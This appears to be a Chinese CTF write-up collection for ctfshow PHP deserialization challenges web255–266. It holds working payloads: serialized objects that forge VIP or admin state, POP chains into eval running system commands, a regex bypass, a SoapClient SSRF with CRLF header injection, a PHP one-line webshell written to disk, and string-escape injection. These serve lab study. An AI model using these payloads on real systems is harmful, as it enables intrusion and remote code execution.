O:11:"ctfShowUser":3:{s:8:"username";s:5:"admin";s:8:"password";s:6:"123456";s:5:"isVip";b:1;}
```


执行 `$user = unserialize($_COOKIE['user']);` 后，`$user` 将是一个 `ctfShowUser` 对象，其属性为：

```plain
$user->username = "admin";
$user->password = "123456";
$user->isVip = true;
```


</details>


1. <strong>逻辑流程</strong>：
    - 如果 `username` 和 `password` 已设置：
        * 调用 `user->login($username, $password)` 验证用户名和密码。
        * 如果验证成功，调用 `user->checkVip()` 检查是否为 VIP。
        * 如果是 VIP，调用 `user->vipOneKeyGetFlag()` 输出 Flag；否则提示 `"no vip, no flag"`。

payload:

<strong><span style="color: rgb(163, 21, 21)">?u</span>sername=xxxxxx&password=xxxxxx</strong>

### web255

```php
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);    
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}
```


1. <strong>逻辑流程</strong>：
+ 如果 `username` 和 `password` 已设置：
    - 调用 `user->login($username, $password)` 验证用户名和密码。
    - 如果验证成功，调用 `user->checkVip()` 检查是否为 VIP。
    - 如果是 VIP，调用 `user->vipOneKeyGetFlag()` 输出 Flag；否则提示 `"no vip, no flag"`。

审计代码，发现，可以从cookie的user中传入payload实例化字符串，同样需要<span style="color: rgb(216, 59, 100)"><strong>`isVip=True`</strong></span>


<details>
<summary>反序列化字符串结构</summary>

#### <strong>1. 序列化字符串的结构</strong>

```plain
O:11:"ctfShowUser":3:{s:8:"username";s:1:"1";s:8:"password";s:1:"2";s:5:"isVip";b:1;}
```


- <strong>`O:11:"ctfShowUser"`</strong>：

- `O` 表示这是一个对象。
- `11` 是类名的长度。
- `"ctfShowUser"` 是类的名称。

- <strong>`:3:`</strong>：

- 表示对象有 3 个属性。

- <strong>`{...}`</strong>：

- 大括号内是对象的属性及其值。

- <strong>`s:8:"username";s:1:"1"`</strong>：

- `s:8:"username"`：`s` 表示字符串，`8` 是属性名的长度，`"username"` 是属性名。
- `s:1:"1"`：`s` 表示字符串，`1` 是属性值的长度，`"1"` 是属性值。

- <strong>`s:8:"password";s:1:"2"`</strong>：

- 同上，表示 `password` 属性的值为 `"2"`。

- <strong>`s:5:"isVip";b:1`</strong>：

- `s:5:"isVip"`：`s` 表示字符串，`5` 是属性名的长度，`"isVip"` 是属性名。
- `b:1`：`b` 表示布尔值，`1` 表示 `true`。

---

#### <strong>2. 特定格式</strong>

PHP 的序列化格式是固定的，以下是其基本规则：

- <strong>对象</strong>：

- 格式：`O:<类名长度>:"<类名>":<属性数量>:{<属性定义>}`
- 示例：`O:11:"ctfShowUser":3:{...}`

- <strong>属性</strong>：

- 每个属性的格式：`<类型>:<长度>:"<值>"`
- 示例：`s:8:"username";s:1:"1"`

- <strong>类型</strong>：

- `s`：字符串。
- `i`：整数。
- `b`：布尔值。
- `a`：数组。
- `O`：对象。

---

#### <strong>3.</strong> <strong><span style="color: #DF2A3F">如何生成这串字符串</span></strong>

这串字符串是通过 PHP 的 `serialize()` 函数生成的。以下是生成步骤：

1. <strong>创建一个</strong>`ctfShowUser`<strong>对象</strong>：

```php
class ctfShowUser {
    public $username = '1';
    public $password = '2';
    public $isVip = true;
  }

$user = new ctfShowUser();
```


2. <strong>序列化对象</strong>：  
   使用 `serialize()` 函数将对象转换为字符串：

```php
echo serialize($user);
```


输出结果：

```plain
O:11:"ctfShowUser":3:{s:8:"username";s:1:"1";s:8:"password";s:1:"2";s:5:"isVip";b:1;}
```


---

#### <strong>4. 反序列化</strong>

如果将这串字符串反序列化，可以还原为原始的 PHP 对象。例如：

```php
$data = 'O:11:"ctfShowUser":3:{s:8:"username";s:1:"1";s:8:"password";s:1:"2";s:5:"isVip";b:1;}';
$user = unserialize($data);

var_dump($user);
```


输出结果：

```php
object(ctfShowUser)#1 (3) {
  ["username"]=> string(1) "1"
    ["password"]=> string(1) "2"
    ["isVip"]=> bool(true)
    }
```


</details>


<details>
<summary>方法一</summary>

```php
<?php
class ctfShowUser{
    public $username='1';
    public $password='2';
    public $isVip=True;
}
$c=new ctfShowUser();
echo urlencode(serialize($c));
```


由于cookie中将`"`作为截断符号，所需要编码绕过，这里采用url编码

```php
user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%221%22%3Bs%3A8%3A%22password%22%3Bs%3A1%3A%222%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D

即为user=O:11:"ctfShowUser":3:{s:8:"username";s:1:"1";s:8:"password";s:1:"2";s:5:"isVip";b:1;}
```


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-110.webp)

最后访问`/?username=1&password=2`得到flag

</details>


<details>
<summary>方法二</summary>

<strong>复制题目中的类并修改\$isVip=true</strong>

```php
class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=true;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}

echo urlencode(serialize(new CtfShowUser()));//将所得的url编码填入cookie中修改
//最后   url+/?username=xxxxxx&password=xxxxxx
```


</details>


### web256

```php
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            if($this->username!==$this->password){
                    echo "your flag is ".$flag;
              }
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);    
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}
```


这里只是不让username和password相等即可

白嫖255payload即可

### web257

```php
<?
class ctfShowUser{
    private $username='xxxxxx';
    private $password='xxxxxx';
    private $isVip=false;
    private $class = 'info';

    public function __construct()//构造函数
   {
        $this->class=new info();
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function __destruct()//析构函数
  {
        $this->class->getInfo();
    }
}
class info{
    private $user='xxxxxx';
    public function getInfo(){
        return $this->user;
    }
}
class backDoor{
    private $code;
    public function getInfo(){
        eval($this->code);
    }
}
$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);
    $user->login($username,$password);
}
```


`__construct()`<strong>：</strong>

+ 这是 PHP 的构造函数，在创建对象时自动调用。
+ 在这里，`__construct()` 初始化 `$class` 属性为一个 `info` 类的对象。

`__destruct()`<strong>：</strong>

+ 这是 PHP 的析构函数，在对象被销毁时自动调用。
+ 在这里，`__destruct()` 调用 `$class->getInfo()`，即调用 `$class` 对象的 `getInfo()` 方法。

首先寻找一下unserialize函数，顺带看了一下流程。接下来找了顺便看了一下哪里能够拿到flag。但是没有找到。

在审计的过程中，看到在backdoor类中，看到了<strong>`eval`</strong>，于是寻找哪里能够控制<strong>`code`</strong>和引用<strong>`back::getInfo()`</strong>；ctfshowuser类中的destruct中看到<strong>`$this->class->getInfo();`</strong>。于是想，从<strong>`ctfshowuser::destruct`</strong>中引用<strong>`backdoor::getInfo()`</strong>，<strong>`backdoor::code`</strong>就是变量。


<details>
<summary>答案</summary>

```php
<?php
class ctfShowUser{
    private $username='1';
    private $password='2';
    private $isVip=false;
    private $class;
	
	public function __construct(){
		$this->class=new backDoor();
	}
}
class backDoor{
    private $code="system('tac flag.php');";
}

$c=new ctfShowUser();
echo urlencode(serialize($c));

```

```php
user=O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A1%3A%221%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A1%3A%222%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A23%3A%22system%28%27tac+flag.php%27%29%3B%22%3B%7D%7D
```


最后访问`/?username=1&password=2`得到flag

在类中嵌套类，需要初始化，所以使用`__construact`函数进行初始化赋值

</details>


### web258--绕过正则

```php
class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;
    public $class = 'info';

    public function __construct(){
        $this->class=new info();
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function __destruct(){
        $this->class->getInfo();
    }

}

class info{
    public $user='xxxxxx';
    public function getInfo(){
        return $this->user;
    }
}

class backDoor{
    public $code;
    public function getInfo(){
        eval($this->code);
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    if(!preg_match('/[oc]:\d+:/i', $_COOKIE['user']))//用+来不匹配正则内容
    {
        $user = unserialize($_COOKIE['user']);
    }
    $user->login($username,$password);
}
```



<details>
<summary>正则匹配内容</summary>

#### <strong>1. 正则表达式结构</strong>

```plain
[oc]:\d+:/
```


- <strong>`[oc]`</strong>：

- 匹配字符 `o` 或 `c`。
- 方括号 `[]` 表示字符集合，匹配其中的任意一个字符。

- <strong>`:`</strong>：

- 匹配一个冒号字符 `:`。

- <strong>`\d+`</strong>：

- `\d` 匹配任意数字（0-9）。
- `+` 表示前面的模式（`\d`）可以出现一次或多次。
- 因此，`\d+` 匹配一个或多个数字。

- <strong>`/`</strong>：

- 匹配一个斜杠字符 `/`。

</details>


<details>
<summary>方法</summary>

```php
<?php
class ctfShowUser{
    public $username='1';
    public $password='2';
    public $isVip=True;
    public $class;
	
	public function __construct(){
		$this->class=new backDoor();
	}
}
class backDoor{
    public $code='eval($_POST[1]);';
}

$c=serialize(new ctfShowUser());
$b=str_replace(':11',':+11',$c);
$b=str_replace(':8',':+8',$b);
echo urlencode($b);
```


这里使用一句话木马 //也可按之前的方法

![](/article-assets/2025/ctfshow-web-notes/images/screenshot-111.webp)

</details>


### web259--ssrf

```php
flag.php

$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
array_pop($xff);
$ip = array_pop($xff);


if($ip!=='127.0.0.1'){
	die('error');
}else{
	$token = $_POST['token'];
	if($token=='ctfshow'){
		file_put_contents('flag.txt',$flag);
	}
}
```


题目为下


```php
<?php

highlight_file(__FILE__);

$vip = unserialize($_GET['vip']);
//vip can get flag one key
$vip->getFlag();

```



<details>
<summary>wp</summary>

如果调用一个没有定义的方法，那么就会使用类本身的call方法。由于给了个ssrf的代码，那么河里推断这是一个ssrf的原生类。

看完了大师傅的视频，大概明白要赶个什么了。顺便说一句，大师傅太顶了！！！

我这里就在kali中做测试了，因为不想在本机上下载nc工具。

额，在kali中，还需要把soap的PHP扩展下载一下。这就比Windows可能方便很多了(只针对我个人嘛)，因为我在Windows中装了一个PHP环境，用的不是phpstudy那边的PHP，所以自己添加外包可能有点麻烦，最主要还是是因为不想在Windows上装nc；

写得多，但是仔细看完就没什么了

#### 安装扩展包

1. 首先查看一下有没有soap包扩展(应该是没有的)

```plain
nl /etc/php/7.4/apache2/php.ini|grep soap
```


1. 下载外包（根据自己的机器上的版本下载）

```plain
apt-get install php7.4-soap
```


1. 再查看一下soap包扩展

```plain
nl /etc/php/7.4/apache2/php.ini|grep soap
```


这个时候，应该是能够查看到的，效果如下，也有可能要等一下

[![](/article-assets/2025/ctfshow-web-notes/images/screenshot-112.webp)](https://img2020.cnblogs.com/blog/2087645/202108/2087645-20210827172134917-1969773295.png)

可以看到`;extension=soap`，说明`soap`扩展已经下载好了，接下来只需要将`;`去除即可。这样也就算了下载且添加进了PHP中，可以使用了。

<strong>接下来回到题目</strong>

在kali中打开nc工具监听一个端口，开一个终端来跑代码；打开web259.php文件(自己写的)，布局可以参考一下下面的。

[![](/article-assets/2025/ctfshow-web-notes/images/screenshot-113.webp)](https://img2020.cnblogs.com/blog/2087645/202108/2087645-20210827172134598-1556002527.png)

在web259.php中写入代码，(*代码不全，因为是一步一步来的，我是希望将题目笔记尽量做细致一点，后来复习的时候也能看懂*)

```plain
<?php

$ua="ctfshow";
$client = new SoapClient(NULL,array('uri'=>"http://127.0.0.1:8181","location"=>"http://127.0.0.1:8181/flag.php","user_agent"=>$ua));

$client->getFlag();
```


开启nc侦听8181端口，接着运行web259.php，从nc工具中可以看到侦听到的数据`User-Agent: ctfshow`，注入的user-agent已经成功了。(目前进度大概是60%)

[![](/article-assets/2025/ctfshow-web-notes/images/screenshot-114.webp)](https://img2020.cnblogs.com/blog/2087645/202108/2087645-20210827172134267-567686025.png)

<strong>看题目：</strong>

1. 题目要从X-Forwarded-For中获取ip。  
   将X-Forwarded-For按照`,`分为数组，接着array_pop第一个元素，最后用第二个元素来作为ip；

所以构造

```plain
$ua="ctfshow\nX-Forwarded-For:127.0.0.1,127.0.0.1"
```


1. 题目要求是post传入的参数，所以要构造一个post表单传入参数token=ctfshow

所以构造

```plain
$ua="ctfshow\nX-Forwarded-For:127.0.0.1,127.0.0.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length:13\n\ntoken=ctfshow";
```


因为设置了`Content-Length=13`，所以只取后面13位，也就恰好吧`token=ctfshow`取完就停止；十分的严格。顺便补一句，反序列化的规矩也是10分的严格。

[![](/article-assets/2025/ctfshow-web-notes/images/screenshot-115.webp)](https://img2020.cnblogs.com/blog/2087645/202108/2087645-20210827172133991-1187317828.png)

由于本地应该是80或者是8080端口，把`:8181`去掉就行了，利用默认端口进去；

最后exp是：

```plain
<?php

$ua="ctfshow\nX-Forwarded-For:127.0.0.1,127.0.0.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length:13\n\ntoken=ctfshow";
$client = new SoapClient(NULL,array('uri'=>"http://127.0.0.1","location"=>"http://127.0.0.1/flag.php","user_agent"=>$ua));

/*$client->getFlag();*/
echo urlencode(serialize($client));
```


payload:

```plain
url?vip=O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A16%3A%22http%3A%2F%2F127.0.0.1%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A124%3A%22ctfshow%0AX-Forwarded-For%3A127.0.0.1%2C127.0.0.1%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0AContent-Length%3A13%0A%0Atoken%3Dctfshow%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
```


访问`url/flag.txt`拿到flag

[![](/article-assets/2025/ctfshow-web-notes/images/screenshot-116.webp)](https://img2020.cnblogs.com/blog/2087645/202108/2087645-20210827172133708-1945166386.png)

</details>


### web260

```php
<?php

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

if(preg_match('/ctfshow_i_love_36D/',serialize($_GET['ctfshow']))){
    echo $flag;
}
```


是对传入的字符串进行序列化，然后检测有没有ctfshow_i_love_36D

直接传入GET参数即可

url+/?ctfshow=ctfshow_i_love_36D

### web261

```php
<?php

highlight_file(__FILE__);

class ctfshowvip{
    public $username;
    public $password;
    public $code;

    public function __construct($u,$p){
        $this->username=$u;
        $this->password=$p;
    }
    public function __wakeup(){
        if($this->username!='' || $this->password!=''){
            die('error');
        }
    }
    public function __invoke(){
        eval($this->code);
    }

    public function __sleep(){
        $this->username='';
        $this->password='';
    }
    public function __unserialize($data){
        $this->username=$data['username'];
        $this->password=$data['password'];
        $this->code = $this->username.$this->password;
    }
    public function __destruct(){
        if($this->code==0x36d){
            file_put_contents($this->username, $this->password);
        }
    }
}

unserialize($_GET['vip']);
```


<strong>代码逻辑</strong>

1. <strong>反序列化流程</strong>：
    - 从 `$_GET['vip']` 获取序列化字符串。
    - 调用 `unserialize()` 反序列化字符串为 `ctfshowvip` 对象。
    - 反序列化时，依次调用 `__wakeup()` 和 `__unserialize()`。
2. <strong>`__wakeup()` 的限制</strong>：
    - 如果 `$username` 或 `$password` 不为空，程序终止并输出 `'error'`。
3. <strong>`__destruct()` 的条件</strong>：
    - 如果 `$code` 等于 `0x36d`（即 `877`），将 `$password` 写入文件，文件名为 `$username`。
4. <strong>`__invoke()` 的危险性</strong>：
    - 如果对象被当作函数调用，会执行 `eval($this->code)`，可能导致任意代码执行。


`__wakeup()` //执行unserialize()时，先会调用这个函数

`__sleep()` //执行serialize()时，先会调用这个函数

`__invoke()` //当尝试将对象调用为函数时触发

`__unserialize()` //在反序列化对象时自动调用（PHP 7.4 及以上版本支持）。


<strong>审计代码发现：</strong>

1. 有`__unserialize()`，在7.4以上版本反序列化会绕过`__wakeup()`函数。
2. 在destruct()函数中，有file_put_contents可以写入文件，一句话木马儿
3. \$this->code==0x36d是弱类型比较，0x36d又有没有打引号，所以代表数字，且数字是877，那么<strong>`877a`</strong>，<strong>`877.php`</strong>等可以通过比较；所以<strong>`设置username='877.php'`</strong>来通过比较


```php
<?php

class ctfshowvip{
    public $username='877.php';
    public $password='<?php eval($_POST[1]);?>';
    public $code=0x36d;

    public function __invoke(){
        eval($this->code);
    }
    public function __destruct(){
        if($this->code==0x36d){
            file_put_contents($this->username, $this->password);
        }
    }
}
$c=new ctfshowvip();
echo serialize($c);
```



```php
url/?vip=O:10:"ctfshowvip":3:{s:8:"username";s:7:"877.php";s:8:"password";s:24:"<?php eval($_POST[1]);?>";s:4:"code";i:877;}
```


<strong>访问url/877.php</strong>执行一句话木马，<strong>`1=system('cat /flag_is_here');`</strong>拿到flag


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-117.webp)

### web262

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-03 02:37:19
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-03 16:05:38
# @message.php
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


error_reporting(0);
class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

$f = $_GET['f'];
$m = $_GET['m'];
$t = $_GET['t'];

if(isset($f) && isset($m) && isset($t)){
    $msg = new message($f,$m,$t);
    $umsg = str_replace('fuck', 'loveU', serialize($msg));
    setcookie('msg',base64_encode($umsg));
    echo 'Your message has been sent';
}

highlight_file(__FILE__);
```


审计一下代码，发现：

1. <strong>`fuck`</strong>会被替换为<strong>`loveU`</strong>
2. 没有看到能够利用的函数或者是和flag有关的，不过<strong>找到message.php</strong>，(建议上午或者下午做题，晚上貌似是做题巅峰，是在是卡)


```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-03 15:13:03
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-03 15:17:17
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/
highlight_file(__FILE__);
include('flag.php');

class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

if(isset($_COOKIE['msg'])){
    $msg = unserialize(base64_decode($_COOKIE['msg']));
    if($msg->token=='admin'){
        echo $flag;
    }
}
```


再审计之后发现，貌似可以直接从message.php这里，只需要看这么一段,就行了，也不用逃逸了，，，，


```php
if(isset($_COOKIE['msg'])){
    $msg = unserialize(base64_decode($_COOKIE['msg']));
    if($msg->token=='admin'){
        echo $flag;
    }
}
```



<details>
<summary>answer 1</summary>

```php
<?php

class message{
    public $from;
    public $msg;
    public $to;
    public $token='admin';
}
$m=new message();
echo base64_encode(serialize($m));
```


payload:

```php
msg=Tzo3OiJtZXNzYWdlIjo0OntzOjQ6ImZyb20iO047czozOiJtc2ciO047czoyOiJ0byI7TjtzOjU6InRva2VuIjtzOjU6ImFkbWluIjt9
```


在message.php页面中，F12，cookie添加msg，<strong><span style="color: #DF2A3F">刷新</span></strong>，拿到flag

</details>


<details>
<summary>字符串逃逸解释</summary>

```php
<?php
class user
{
    public $username;
    public $password;
    public $isVIP;

    public function __construct($u,$p)
    {
        $this->username = $u;
        $this->password = $p;
        $this->isVIP = 0;
    }
}
function filter($s)
{
    return str_replace('admin','hacker',$s);
}
$u = new user('admin','123456');
$u_seri = serialize($u);
$us = filter($u_seri);

echo $us;

//O:4:"user":3:{s:8:"username";s:5:"admin";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}   -->admin无filter
//O:4:"user":3:{s:8:"username";s:5:"hacker";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}  -->admin有filter
//O:4:"user":3:{s:8:"username";s:52:"hacker";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}    /*  ";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}   -->

```


第二次中 hacker六个字符，却只检测到五个字符

第三次52个字符中，hacker有5个字符被有效读取 此时多了一个r未被读取

我们的目的是让最终输出的序列化内容符合所读取的字符个数

因此 根据每多一个admin就多逃出一个，即让多逃出的字符的数量抵掉未显示出来的字符即可 故需要47个admin

总之 <strong>";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}插入的字符个数 即为替换前字符的个数</strong>

</details>


<details>
<summary>answer 2</summary>

#### 字符串逃逸

首先要知道这里是将`fuck`修改成了`loveU`,由4个字符长度，变成了5个，长度发生了变化，导致了反序列化字符串结构改变。

我们知道，反序列化过程十分的严格，多读取一个，或者是少读取一个都是不被允许，会报错的。一旦长度有了变化，那么就会报错。加入我们精心构造一个字符串，那么不但不会报错，而且还能够拿到flag。

看了message.php我们知道，只需传入的payload在反序列化的时候，反出来一个`token=admin`，就行。

这是用来测试的文件

```php
<?php

class message{
    public $from;
    public $msg;
    public $to;
    public $token='admin';
	public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

$f = $_GET['f'];
$m = $_GET['m'];
$t = $_GET['t'];

$msg = new message($f,$m,$t);
$umsg = str_replace('fuck', 'loveU', serialize($msg));
echo $umsg;echo "<br>";
var_dump(unserialize($umsg));#如果反序列化成功，就会输出结果，没结果就是bool(false)

```


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-118.webp)

即27个fuck被替换为27个loveU 抵掉即可

O:7:"message":4:{s:4:"from";N;s:3:"msg";N;s:2:"to";s:135:"loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU";s:5:"token";s:5:"admin";}";s:5:"token";s:5:"admin";}

```php
url/?f=1&m=3&t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";} 
```


再访问message.php即可

</details>


### 未web263

```php
<?php
error_reporting(0);
ini_set('display_errors', 0);
ini_set('session.serialize_handler', 'php');
date_default_timezone_set("Asia/Shanghai");
session_start();
use \CTFSHOW\CTFSHOW; 
require_once 'CTFSHOW.php';
$db = new CTFSHOW([
    'database_type' => 'mysql',
    'database_name' => 'web',
    'server' => 'localhost',
    'username' => 'root',
    'password' => 'root',
    'charset' => 'utf8',
    'port' => 3306,
    'prefix' => '',
    'option' => [
        PDO::ATTR_CASE => PDO::CASE_NATURAL
    ]
]);

// sql注入检查
function checkForm($str){
    if(!isset($str)){
        return true;
    }else{
    return preg_match("/select|update|drop|union|and|or|ascii|if|sys|substr|sleep|from|where|0x|hex|bin|char|file|ord|limit|by|\`|\~|\!|\@|\#|\\$|\%|\^|\\|\&|\*|\(|\)|\（|\）|\+|\=|\[|\]|\;|\:|\'|\"|\<|\,|\>|\?/i",$str);
    }
}


class User{
    public $username;
    public $password;
    public $status;
    function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }
    function setStatus($s){
        $this->status=$s;
    }
    function __destruct(){
        file_put_contents("log-".$this->username, "使用".$this->password."登陆".($this->status?"成功":"失败")."----".date_create()->format('Y-m-d H:i:s'));
    }
}

/*生成唯一标志
*标准的UUID格式为：xxxxxxxx-xxxx-xxxx-xxxxxx-xxxxxxxxxx(8-4-4-4-12)
*/

function  uuid()  
{  
    $chars = md5(uniqid(mt_rand(), true));  
    $uuid = substr ( $chars, 0, 8 ) . '-'
            . substr ( $chars, 8, 4 ) . '-' 
            . substr ( $chars, 12, 4 ) . '-'
            . substr ( $chars, 16, 4 ) . '-'
            . substr ( $chars, 20, 12 );  
    return $uuid ;  
}  

```


dirsearch扫描发现www.zip，看来是seesion反序列化了，

想了一下，突然意识到，貌似session反序列化可以直接把session中能反的给了；

人给我做傻了这题，不知道是不是因为开局就输入账号密码错误了几次，导致后来的cookie没有写入给整自闭了。所以查看cookie，limit一直是1。就有点不明所以了。

[当然，我也是看了大师傅的视频才做了出来的，点击跳转](https://www.bilibili.com/video/BV1D64y1m78f?p=10&spm_id_from=pageDriver)

审计代码：

找到，当user类被析构的时候，会有<strong>`file_put_content`</strong>的，执行，借此可以吸入一句话木马；


### web264

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-03 02:37:19
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-03 16:05:38
# @message.php
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


error_reporting(0);
session_start();

class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

$f = $_GET['f'];
$m = $_GET['m'];
$t = $_GET['t'];

if(isset($f) && isset($m) && isset($t)){
    $msg = new message($f,$m,$t);
    $umsg = str_replace('fuck', 'loveU', serialize($msg));
    $_SESSION['msg']=base64_encode($umsg);
    echo 'Your message has been sent';
}

highlight_file(__FILE__);

```


观察message.php


```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-03 15:13:03
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-03 15:17:17
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/
session_start();
highlight_file(__FILE__);
include('flag.php');

class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

if(isset($_COOKIE['msg'])){
    $msg = unserialize(base64_decode($_SESSION['msg']));
    if($msg->token=='admin'){
        echo $flag;
    }
}
```



<details>
<summary>answer 1</summary>

```php
<?php

class message{
    public $from;
    public $msg;
    public $to;
    public $token='admin';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

$f = $_GET['f'];
$m = $_GET['m'];
$t = 'fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}';

$msg = new message($f,$m,$t);
$umsg = str_replace('fuck', 'loveU', serialize($msg));
echo $umsg;echo "<br>";
var_dump(unserialize($umsg));#如果反序列化成功，就会输出结果，没结果就是bool(false)
```

```php
url?f=1&m=3&t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}
```


输入后 访问message.php 最后再在message.php传入msg一个任意cookie值即可

</details>


### web265

```php
<?
include('flag.php');
highlight_file(__FILE__);
class ctfshowAdmin{
    public $token;
    public $password;

    public function __construct($t,$p){
        $this->token=$t;
        $this->password = $p;
    }
    public function login(){
        return $this->token===$this->password;
    }
}

$ctfshow = unserialize($_GET['ctfshow']);
$ctfshow->token=md5(mt_rand());

if($ctfshow->login()){
    echo $flag;
}
```


<span style="color: #DF2A3F"><strong>`mt_rand()`</strong></span> 是 PHP 中的一个函数，用于生成<strong>伪随机数</strong>。它是 `rand()` 函数的改进版本，基于 <strong>Mersenne Twister</strong> 算法实现，具有更高的性能和更好的随机性。

因此本题预测不了mt_rand()且md5(mt_rand())确实预测不了

故利用引用的方式，<strong>将password赋值为token的引用</strong>


```php
<?php
class ctfshowAdmin{
    public $token;
    public $password;
	
	public function __construct(){
        $this->password=&$this->token;
    }
}

$c=new ctfshowAdmin();
echo (serialize($c));echo"\n";

```


payload：


```php
url/?ctfshow=O:12:"ctfshowAdmin":2:{s:5:"token";N;s:8:"password";R:2;}
```


### web266--伪协议，正则绕过

```php
include('flag.php');
$cs = file_get_contents('php://input');


class ctfshow{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public function __construct($u,$p){
        $this->username=$u;
        $this->password=$p;
    }
    public function login(){
        return $this->username===$this->password;
    }
    public function __toString(){
        return $this->username;
    }
    public function __destruct(){
        global $flag;
        echo $flag;
    }
}
$ctfshowo=@unserialize($cs);
if(preg_match('/ctfshow/', $cs)){
    throw new Exception("Error $ctfshowo",1);
}
```


<strong>区分大小写的： 变量名、常量名、<span style="color: rgb(252, 85, 49)">数组</span>索引（键名key）</strong>

